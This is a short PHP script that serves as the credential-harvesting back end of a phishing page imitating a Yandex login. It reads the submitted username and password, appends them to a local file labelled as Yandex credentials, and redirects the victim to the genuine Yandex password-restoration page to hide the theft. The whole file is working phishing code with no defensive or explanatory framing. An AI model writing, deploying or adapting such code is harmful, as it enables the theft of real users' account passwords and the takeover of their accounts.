<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST['login'] ?? '';
    $passwd = $_POST['passwd'] ?? '';

    $log = "Yandex Username: $login | Pass: $passwd\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://passport.yandex.com/restoration');
    exit();
}
?>
